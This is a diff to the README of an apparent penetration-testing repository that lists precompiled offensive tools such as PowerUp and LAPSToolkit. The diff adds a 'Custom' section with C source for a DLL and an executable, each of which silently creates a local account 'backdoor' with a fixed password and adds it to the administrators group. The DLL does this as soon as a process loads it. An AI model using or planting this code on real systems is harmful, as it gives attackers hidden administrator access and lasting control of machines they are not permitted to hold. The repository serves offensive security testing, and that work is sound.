@@ -14,6 +14,7 @@ Collection of useful tools, scripts and pre-compiled binaries for enumerating an
     - [GPO Abuse](#gpo-abuse)
     - [Certificate Abuse](#certificate-abuse)
     - [Scripts](#scripts)
+    - [Custom](#custom)
 
 ## Disclaimer
 
@@ -99,3 +100,47 @@ ONLY use for ethical purposes and against targets that you are permitted to atta
 || [PowerUp](https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc) | Windows Privilege Escalation |  https://github.com/jakobfriedl/precompiled-binaries/raw/main/Scripts/PowerUp.ps1 |
 || [PowerUpSQL](https://github.com/NetSPI/PowerUpSQL) | SQL Server Enumeration and Exploitation |  https://github.com/jakobfriedl/precompiled-binaries/raw/main/Scripts/PowerUpSQL.ps1 |
 || [LAPSToolkit](https://github.com/leoloobeek/LAPSToolkit) | LAPS Password dumping |  https://github.com/jakobfriedl/precompiled-binaries/raw/main/Scripts/LAPSToolkit.ps1 |
+
+### Custom 
+[SimpleBackdoorAdmin.dll](https://github.com/jakobfriedl/precompiled-binaries/raw/main/Specific/SimpleBackdoorAdmin.dll)
+
+```c
+#include <stdlib.h>
+#include <windows.h>
+
+BOOL APIENTRY DllMain(
+HANDLE hModule,// Handle to DLL module
+DWORD ul_reason_for_call,// Reason for calling function
+LPVOID lpReserved ) // Reserved
+{
+    switch ( ul_reason_for_call )
+    {
+        case DLL_PROCESS_ATTACH: // A process is loading the DLL.
+        int i;
+  	    i = system ("net user backdoor Password123! /add");
+  	    i = system ("net localgroup administrators backdoor /add");
+        break;
+        case DLL_THREAD_ATTACH: // A process is creating a new thread.
+        break;
+        case DLL_THREAD_DETACH: // A thread exits normally.
+        break;
+        case DLL_PROCESS_DETACH: // A process unloads the DLL.
+        break;
+    }
+    return TRUE;
+}
+```
+
+[SimpleBackdoorAdmin.exe](https://github.com/jakobfriedl/precompiled-binaries/raw/main/Specific/SimpleBackdoorAdmin.exe)
+```c
+#include <stdlib.h>
+
+int main ()
+{
+  system("net user backdoor Password123! /add");
+  system("net localgroup administrators backdoor /add");
+
+  return 0;
+}
+```
+
